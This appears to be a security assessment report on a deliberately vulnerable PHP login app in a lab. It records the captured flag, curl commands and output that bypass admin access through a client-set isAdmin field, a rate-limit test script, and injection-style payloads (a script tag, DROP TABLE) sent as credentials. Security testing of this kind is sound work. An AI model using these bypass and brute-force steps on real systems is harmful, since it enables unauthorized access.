# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:36003
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Multiple critical authentication vulnerabilities were successfully exploited:
- **AUTH-VULN-01 (Critical):** Client-controlled authorization bypass allowing complete admin access without valid credentials by manipulating the `isAdmin` parameter
- **AUTH-VULN-02 (High):** Missing rate limiting enabling unlimited automated authentication attacks (749+ requests/second achieved)
- **AUTH-VULN-03 (High):** Stateless authorization architecture with no session management, requiring authorization re-supply on every request
- **AUTH-VULN-05 (Critical):** Complete credential validation bypass - username and password parameters never validated, any values accepted
- **AUTH-VULN-06 (High):** Unencrypted HTTP transport exposing all credentials and flag data to network interception
- **AUTH-VULN-07 (Medium):** Missing cache-control headers allowing sensitive authentication data and flags to persist in browser/proxy caches

**Authorization Vulnerabilities:**
One critical authorization vulnerability was successfully exploited:
- **AUTHZ-VULN-01 (Critical, CVSS 9.8):** Client-controlled authorization parameter enabling vertical privilege escalation from anonymous user to admin through manipulation of the `isAdmin` POST parameter, resulting in immediate FLAG disclosure. This represents OWASP A01:2021 Broken Access Control and CWE-639.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application does not reflect user input in responses, has no JavaScript code, and no persistent storage mechanism.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database connectivity and executes no shell commands. The minimal architecture (82 lines of PHP) eliminates entire vulnerability classes by omission.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application makes no outbound HTTP requests and has no functionality for fetching external resources.

## Network Reconnaissance

**Target Application Port:**
- **Port 36003/tcp (HTTP):** Apache 2.4.25 (Debian) with PHP 5.6.40 - Primary target application accessible via unencrypted HTTP

**Security-Relevant Infrastructure Findings:**
- **No HTTPS Support:** Application exposes only port 80 (HTTP), no TLS/SSL configuration present
- **End-of-Life Software Stack:** PHP 5.6.40 (EOL January 2019) and Debian 9 (EOL July 2022) with no security patches available
- **Docker Containerization:** Application runs in isolated container based on php:5-apache image, port 80 mapped to host port 36003
- **No Security Middleware:** No rate limiting, no WAF, no CAPTCHA, no abuse prevention mechanisms detected
- **Exposed Services (Out of Scope):** Additional services detected on host (port 80 Caddy, 443 HTTPS, 631 CUPS, 49152 Tailscale) are not part of this assessment

**Attack Surface:**
- **Minimal Surface:** Single dynamic endpoint (POST /index.php) plus three static image assets
- **Zero Input Validation:** Only isset() checks, no sanitization or validation of POST parameters
- **Zero Session Management:** Completely stateless with no cookies or server-side state
- **Critical Exposure:** Hidden form field `isAdmin` controls authorization decisions, trivially modifiable via browser DevTools or HTTP interception

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Client-Controlled Authorization Bypass

**Summary:**
- **Vulnerable location:** POST /index.php - Hidden form field `isAdmin` at line 65, authorization check at line 72
- **Overview:** Complete authentication bypass through manipulation of client-controlled `isAdmin` parameter
- **Impact:** Full administrative access and flag disclosure without valid credentials
- **Severity:** Critical (CVSS 9.8)

**Prerequisites:** None required
- No valid credentials needed
- No session required
- No special tools required (can be done with browser DevTools)

**Exploitation Steps:**

1. Send POST request to http://localhost:36003/index.php with `isAdmin` parameter set to "true":
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=[ANY_VALUE]" \
     -d "password=[ANY_VALUE]" \
     -d "isAdmin=true"
   ```

2. Observe successful administrative access in response

**Proof of Impact:**

Flag captured: `FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}`

Complete exploitation output:
```
$ curl -X POST http://localhost:36003/index.php -d "username=attacker&password=anything&isAdmin=true" 2>/dev/null | grep -i "flag"

    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
```

Verification of denial when `isAdmin=false`:
```
$ curl -X POST http://localhost:36003/index.php -d "username=test&password=test&isAdmin=false" 2>/dev/null | grep -E "(Welcome|Incorrect)"

<h1>Welcome to Springfield!</h1>
    <center><h3>Incorrect username/password!</h3></center></body>
```

**Notes:**
- This vulnerability represents OWASP A01:2021 Broken Access Control
- The authorization decision is based entirely on a client-controlled POST parameter
- No server-side validation of user privileges occurs
- Success rate: 100% (deterministic bypass)

---

### AUTH-VULN-02: Missing Rate Limiting on Authentication Endpoint

**Summary:**
- **Vulnerable location:** POST /index.php - Lines 68-79 (entire authentication logic)
- **Overview:** Zero rate limiting, CAPTCHA, or account lockout protection on authentication endpoint
- **Impact:** Unlimited automated authentication attacks possible without detection or throttling
- **Severity:** High

**Prerequisites:** None required
- No authentication needed to perform attacks
- Standard HTTP client sufficient

**Exploitation Steps:**

1. Create Python script to perform automated authentication attempts:
   ```python
   import requests
   import time

   url = "http://localhost:36003/index.php"

   start_time = time.time()
   success_count = 0

   for i in range(50):
       response = requests.post(url, data={
           'username': 'test',
           'password': 'test',
           'isAdmin': 'false'
       })
       if response.status_code == 200:
           success_count += 1

   elapsed = time.time() - start_time
   print(f"Total requests: 50")
   print(f"Successful: {success_count}")
   print(f"Time: {elapsed:.2f}s")
   print(f"Rate: {50/elapsed:.2f} req/sec")
   ```

2. Execute script and observe no rate limiting enforcement

**Proof of Impact:**

Automated attack results:
```
Total Requests Sent: 50
Successful Responses (HTTP 200): 50 (100%)
Rate Limit Responses (HTTP 429): 0
Total Time Taken: 0.07 seconds
Average Requests Per Second: 749.38
```

All 50 consecutive authentication attempts succeeded without:
- HTTP 429 (Too Many Requests) responses
- Account lockout mechanisms
- Delays or throttling
- CAPTCHA challenges
- Any form of abuse prevention

**Notes:**
- Application processes unlimited requests without tracking failed attempts
- No rate limiting in code, Docker configuration, or Apache
- No WAF or middleware protection
- Enables brute force, credential stuffing, and password spraying attacks

---

### AUTH-VULN-03: Stateless Authorization Enabling Persistent Bypass

**Summary:**
- **Vulnerable location:** Entire application - No session management infrastructure
- **Overview:** Application is completely stateless with no persistent authentication state
- **Impact:** Authorization must be re-supplied on every request via client-controlled parameter
- **Severity:** High

**Prerequisites:** None required

**Exploitation Steps:**

1. Send authenticated request with `isAdmin=true` and save any cookies:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=test&password=test&isAdmin=true" \
     -c cookies.txt -b cookies.txt
   ```

2. Verify no session cookies are set:
   ```bash
   cat cookies.txt
   ```

3. Send second request with `isAdmin=false` using saved cookies:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=test&password=test&isAdmin=false" \
     -b cookies.txt
   ```

4. Observe that authorization decision is made fresh on each request

**Proof of Impact:**

First request with `isAdmin=true`:
```
$ curl -X POST http://localhost:36003/index.php -d "username=test&password=test&isAdmin=true" -c cookies.txt 2>/dev/null | grep -i "flag"

    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
```

Cookie file shows no session cookies:
```
$ cat cookies.txt
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
```

Second request with `isAdmin=false` and same cookies:
```
$ curl -X POST http://localhost:36003/index.php -d "username=test&password=test&isAdmin=false" -b cookies.txt 2>/dev/null | grep -E "(Welcome Admin|Incorrect)"

    <center><h3>Incorrect username/password!</h3></center></body>
```

No Set-Cookie headers in response:
```
$ curl -X POST http://localhost:36003/index.php -d "username=test&password=test&isAdmin=true" -v 2>&1 | grep -i "set-cookie"
(no output - no cookies set)
```

**Notes:**
- No `session_start()` call anywhere in codebase
- No `$_SESSION` variable usage
- No `setcookie()` calls
- Authorization decision is made per-request based on POST parameters
- Even if credentials were validated (they're not), authenticated state cannot persist

---

### AUTH-VULN-05: Complete Credential Validation Bypass

**Summary:**
- **Vulnerable location:** POST /index.php - Lines 71-78 (authentication logic)
- **Overview:** Username and password parameters checked with isset() but never validated
- **Impact:** Any credentials (including empty/invalid) grant access with isAdmin manipulation
- **Severity:** Critical

**Prerequisites:** None required

**Exploitation Steps:**

1. Submit request with empty username and password:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=" \
     -d "password=" \
     -d "isAdmin=true"
   ```

2. Submit request with obviously invalid credentials:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=INVALID_USER_12345" \
     -d "password=WRONG_PASSWORD_9999" \
     -d "isAdmin=true"
   ```

3. Submit request with malicious payloads as credentials:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=<script>alert('xss')</script>" \
     -d "password='; DROP TABLE users;--" \
     -d "isAdmin=true"
   ```

4. Observe admin access granted in all cases

**Proof of Impact:**

Empty credentials:
```
$ curl -X POST http://localhost:36003/index.php -d "username=&password=&isAdmin=true" 2>/dev/null | grep -i "flag"

    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
```

Invalid credentials:
```
$ curl -X POST http://localhost:36003/index.php -d "username=INVALID_USER_12345&password=WRONG_PASSWORD_9999&isAdmin=true" 2>/dev/null | grep -i "flag"

    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
```

Malicious payloads:
```
$ curl -X POST http://localhost:36003/index.php -d "username=<script>alert('xss')</script>&password='; DROP TABLE users;--&isAdmin=true" 2>/dev/null | grep -i "flag"

    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
```

**Notes:**
- Line 71 checks `isset($_POST['username'])` and `isset($_POST['password'])` only
- No credential validation code exists in application
- No password hashing verification (bcrypt, password_hash(), etc.)
- No database lookup for credential verification
- Username and password values are never used in authorization decision
- Authentication is purely theatrical - collects credentials to appear legitimate

---

### AUTH-VULN-06: Unencrypted HTTP Transport Exposing Credentials

**Summary:**
- **Vulnerable location:** Application infrastructure - Docker exposes only port 80 (HTTP)
- **Overview:** All traffic transmitted over unencrypted HTTP with no HTTPS option
- **Impact:** Credentials, flag, and all authentication data exposed to network interception
- **Severity:** High

**Prerequisites:**
- Network access to observe traffic (same network, ISP-level, or man-in-the-middle position)

**Exploitation Steps:**

1. Submit authentication request over HTTP and capture traffic:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=victim_user&password=secret_password123&isAdmin=true" \
     -v
   ```

2. Observe plaintext protocol (HTTP/1.1) in connection details

3. Verify HTTPS is not available:
   ```bash
   curl -k https://localhost:36003/index.php
   ```

**Proof of Impact:**

HTTP connection details showing plaintext transmission:
```
$ curl -X POST http://localhost:36003/index.php -d "username=admin&password=P@ssw0rd!&isAdmin=true" -v 2>&1 | grep -E "(^\*|^>|^<)" | head -15

* Host localhost:36003 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
* Connected to localhost (::1) port 36003
> POST /index.php HTTP/1.1
> Host: localhost:36003
> User-Agent: curl/8.7.1
> Accept: */*
> Content-Length: 47
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 47 bytes
< HTTP/1.1 200 OK
< Date: Wed, 29 Oct 2025 18:39:25 GMT
< Server: Apache/2.4.25 (Debian)
```

Key observations:
- Protocol: `HTTP/1.1` (not HTTPS)
- Port: 36003 (no TLS)
- No SSL/TLS handshake occurs
- POST body transmitted in plaintext

HTTPS not available:
```
$ curl -k https://localhost:36003/index.php 2>&1 | head -3
curl: (35) LibreSSL/3.3.6: error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version
```

**Notes:**
- Docker exposes only port 80 (docker-compose.yml:8)
- No SSL/TLS configuration in Apache
- No HTTPS redirect
- No Strict-Transport-Security (HSTS) headers
- All POST data including username, password, isAdmin parameter, and flag response transmitted in cleartext
- Vulnerable to network-level attacks by attacker on same network or ISP-level interception

---

### AUTH-VULN-07: Missing Cache-Control Headers on Sensitive Authentication Responses

**Summary:**
- **Vulnerable location:** POST /index.php response - Lines 73-74 (admin response with flag)
- **Overview:** No cache-control headers on authentication responses containing sensitive data
- **Impact:** Flag and authentication data may be cached by browsers or proxies
- **Severity:** Medium

**Prerequisites:**
- Access to shared computer or intermediate proxy that caches responses

**Exploitation Steps:**

1. Perform successful authentication:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=test&password=test&isAdmin=true" \
     -D -
   ```

2. Check response headers for cache-control directives

3. Save response to demonstrate cacheability:
   ```bash
   curl -X POST http://localhost:36003/index.php \
     -d "username=test&password=test&isAdmin=true" \
     -o cached_response.html
   ```

4. Access cached response containing flag

**Proof of Impact:**

Response headers showing missing cache controls:
```
$ curl -X POST http://localhost:36003/index.php -d "username=test&password=test&isAdmin=true" -D - 2>/dev/null | head -15

HTTP/1.1 200 OK
Date: Wed, 29 Oct 2025 18:39:48 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Vary: Accept-Encoding
Content-Length: 3349
Content-Type: text/html; charset=UTF-8
```

Observed: No `Cache-Control`, `Pragma`, or `Expires` headers present

Response cached with flag:
```
$ curl -X POST http://localhost:36003/index.php -d "username=test&password=test&isAdmin=true" -o /tmp/cached_response.html 2>/dev/null && grep -i "flag" /tmp/cached_response.html

    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center></body>
```

**Notes:**
- No `header()` calls to set cache directives in PHP code
- HTTP response includes no cache-control directives
- Successful admin authentication response (lines 73-74) includes sensitive flag value
- Browser history or shared proxy cache could retain sensitive authentication data
- Impact amplified by HTTP-only transport (AUTH-VULN-06)
- An attacker with access to shared computer could retrieve cached flag from browser cache

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Client-Controlled Authorization Parameter Bypass (Vertical Privilege Escalation)

**Summary:**
- **Vulnerable location:** POST /index.php - Authorization logic at line 72 of index.php
- **Overview:** Anonymous users can escalate to admin privileges by manipulating the client-controlled `isAdmin` POST parameter, resulting in immediate FLAG disclosure. The application implements authorization using a client-supplied parameter without any server-side validation, session checks, or database role lookup.
- **Impact:** Complete authorization bypass allowing any anonymous user to gain admin privileges and access the CTF flag. This demonstrates a critical failure in access control where authorization decisions are based entirely on client-controlled data.
- **Severity:** Critical (CVSS 9.8 - CWE-639: Authorization Bypass Through User-Controlled Key)

**Prerequisites:**
- Network access to http://localhost:36003 (no authentication required)
- Ability to send HTTP POST requests (curl, browser, or HTTP client)
- No special credentials, tokens, or prior authentication needed

**Exploitation Steps:**

1. **Send POST request with manipulated isAdmin parameter:**
```bash
curl -X POST http://localhost:36003/index.php \
  -d "username=testuser" \
  -d "password=testpass" \
  -d "isAdmin=true"
```

2. **Server processes the request:**
   - Application checks if POST parameters exist using `isset()` (line 71)
   - Application evaluates `$_POST['isAdmin'] == "true"` (line 72)
   - Since we sent `isAdmin=true`, condition evaluates to TRUE
   - Application grants admin access without validating credentials

3. **Response received with admin privileges:**
   - Server returns "Welcome Admin" greeting
   - FLAG disclosed in response: `FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}`

**Proof of Impact:**

**Successful Exploitation (isAdmin=true):**
```
Request:
POST /index.php HTTP/1.1
Host: localhost:36003
Content-Type: application/x-www-form-urlencoded

username=testuser&password=testpass&isAdmin=true

Response:
<center><h2>Welcome Admin</h2></center>
<center><h3>Congratulations, here is the flag: FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}</h3></center>
```

**Failed Exploitation for Comparison (isAdmin=false):**
```
Request:
POST /index.php HTTP/1.1
Host: localhost:36003
Content-Type: application/x-www-form-urlencoded

username=normaluser&password=testpass&isAdmin=false

Response:
<center><h3>Incorrect username/password!</h3></center>
```

**FLAG Captured:** `FLAG{46c3ef043123012aa7ed0ab5a0c6a7e40a53a624ce3ae406f52e7301a8033a9b}`

**Technical Analysis:**

**Root Cause:**
The application violates the fundamental security principle that authorization decisions must be based on trusted, server-side data sources. The vulnerable code at line 72 (`if ($_POST['isAdmin'] == "true")`) makes an authorization decision based entirely on client-supplied POST data without:
- Session validation
- Database role lookup
- Cryptographic signature verification
- Any server-side verification of admin status

**Why This Works:**
1. Application has no authentication mechanism (username/password never validated)
2. Application has no session management (completely stateless)
3. Application has no database to store user roles
4. Hidden form field at line 65 creates false security - easily modified via browser DevTools, proxy interception, or direct HTTP requests
5. The `isset()` check only verifies parameter existence, not validity

**Alternative Exploitation Methods:**

**Method 1 - Browser DevTools:**
1. Navigate to http://localhost:36003
2. Open browser DevTools (F12) → Elements/Inspector tab
3. Find: `<input type="hidden" name="isAdmin" value="false" />`
4. Double-click `value="false"` and change to `value="true"`
5. Enter any username/password in the form
6. Click "Login" button
7. Result: FLAG disclosed

**Method 2 - HTTP Proxy (Burp Suite/ZAP):**
1. Configure browser to use intercepting proxy
2. Navigate to http://localhost:36003 and submit login form
3. Intercept the POST request
4. Modify request body: change `isAdmin=false` to `isAdmin=true`
5. Forward the modified request
6. Result: FLAG disclosed

**Method 3 - Command Line (simplified):**
```bash
curl -s -X POST http://localhost:36003/index.php \
  -d "username=anything" \
  -d "password=anything" \
  -d "isAdmin=true" | grep -o "FLAG{[^}]*}"
```

**Notes:**

**Exploitation Characteristics:**
- **Success Rate:** 100% (deterministic bypass)
- **Authentication Required:** None (exploitable by anonymous users)
- **Rate Limiting:** None (unlimited exploitation attempts)
- **CAPTCHA Protection:** None
- **Audit Trail:** Only Apache HTTP access logs (POST body not logged)

**Tested Edge Cases:**
- Parameter must be exactly `isAdmin=true` (case-sensitive)
- `isAdmin=TRUE` fails (uppercase not accepted)
- `isAdmin=1` fails (type coercion not applied)
- `isAdmin[]=true` fails (array syntax breaks isset() check)
- Username and password can be any value (never validated)

**CWE Classification:** CWE-639 - Authorization Bypass Through User-Controlled Key

**OWASP Mapping:** A01:2021 - Broken Access Control

**Secure Implementation Recommendation:**
```php
// SECURE EXAMPLE (what should be implemented):
session_start();
// After proper authentication...
if (isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'admin') {
    // Grant admin access
    // Role determined from server-side session, not client parameter
}
```

---
